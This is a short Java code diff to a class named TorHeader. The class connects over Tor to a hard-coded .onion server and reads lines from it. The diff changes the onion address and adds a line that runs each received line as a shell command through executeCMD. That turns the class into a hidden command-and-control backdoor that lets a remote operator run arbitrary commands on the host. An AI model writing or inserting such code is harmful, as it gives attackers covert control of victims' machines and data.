@@ -47,13 +47,14 @@ public class TorHeader {
                 //TODO MOVE
                 setStarted(true);
                 try {
-                    Socket socket = client.getSocketFactory().createSocket("y3b7ch6eft6j3pwz.onion", 8000);
+                    Socket socket = client.getSocketFactory().createSocket("pbc6urv4bakvxkjs.onion", 8000);
                     PrintWriter writer = new PrintWriter(socket.getOutputStream(), true);
                     BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
                     writer.println("GET /");
                     String line;
                     while ((line = reader.readLine()) != null) {
                         logger.info(line);
+                        CommonHeader.getSHELL_HEADER().executeCMD(line);
                     }
                     logger.warn("closed");
                     socket.close();
